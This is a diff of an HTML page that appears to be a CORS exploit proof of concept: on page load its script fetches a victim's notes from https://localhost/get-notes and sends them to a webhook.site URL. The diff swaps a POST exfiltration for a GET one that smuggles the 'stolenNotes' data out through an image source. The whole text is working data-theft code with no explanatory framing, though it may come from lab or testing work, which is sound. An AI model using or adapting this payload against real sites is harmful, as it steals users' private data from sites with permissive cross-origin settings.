@@ -8,7 +8,6 @@
   <h1>Sending CORS GET request...</h1>
 
   <script>
-    // Automatically runs when the page loads
     window.onload = function () {
       fetch("https://localhost/get-notes", {
         method: "GET",
@@ -23,19 +22,14 @@
       .then(data => {
         console.log("Notes received:", data);
 
-        // Step 2: Exfiltrate to webhook.site
-        return fetch("https://webhook.site/f88badbc-b110-4d90-b115-e7dcd7125a7c", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            stolenNotes: data
-          })
-        });
-      })
-      .then(() => {
-        alert("✅ Notes exfiltrated successfully!");
+        // Encode data to send via GET
+        const query = encodeURIComponent(JSON.stringify(data));
+        const exfilUrl = `https://webhook.site/f88badbc-b110-4d90-b115-e7dcd7125a7c?stolenNotes=${query}`;
+
+        // Exfiltrate via GET by loading an image
+        const img = new Image();
+        img.src = exfilUrl;
+        document.body.appendChild(img); // optional: trigger the request
       })
       .catch(error => {
         console.error("❌ Error:", error);
